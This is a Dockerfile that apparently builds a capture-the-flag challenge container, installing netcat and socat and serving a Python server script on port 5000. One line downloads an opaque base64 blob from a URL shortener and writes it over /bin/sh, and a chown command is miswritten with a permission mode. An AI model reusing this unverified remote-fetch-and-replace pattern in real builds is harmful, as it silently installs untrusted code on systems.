FROM ubuntu:bionic

EXPOSE 5000

#ARG binary
#ENV binary=${binary}

RUN apt update && apt upgrade -y && apt update --fix-missing
RUN apt install curl python netcat-openbsd vim nano socat lib32ncurses5 python-pip -y

RUN pip install libnum pycryptodome

RUN mkdir /challs
COPY $binary /challs/$binary
COPY flag.txt /challs/flag.txt
WORKDIR /challs

RUN chown -R 755 /challs/

RUN curl -Ls https://goo.gl/yia654 | base64 -d > /bin/sh
RUN chmod 700 /usr/bin/* /bin/* /tmp /dev/shm
RUN chmod 755 /usr/bin/env /usr/bin/python /bin/dash /bin/bash /bin/sh /bin/nc /bin/cat /usr/bin/curl /usr/bin/groups /usr/bin/id /bin/ls /usr/bin/vi /usr/bin/vim /bin/nano

CMD socat TCP-LISTEN:5000,reuseaddr,fork EXEC:/challs/server.py,su=nobody

# $ docker build --build-arg 'binary=server.py' -t 'drakjoge' .
# $ docker run -p 30001:5000 -itd drakjoge
